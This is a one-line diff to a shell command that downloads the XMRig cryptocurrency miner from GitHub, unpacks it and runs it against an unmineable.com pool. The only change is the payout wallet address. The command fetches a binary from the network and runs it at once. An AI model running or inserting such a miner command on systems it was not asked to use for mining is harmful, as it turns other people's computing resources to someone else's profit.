@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -zxvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u BABYDOGE:0x49210f5d1b2112b6e88a4Fd1221Ab10CEAcC809C.penyus -p x
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -zxvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u AVAX.0x9d3c2cbe09e1744de7b717bb572af348b3222349.penyus -p x
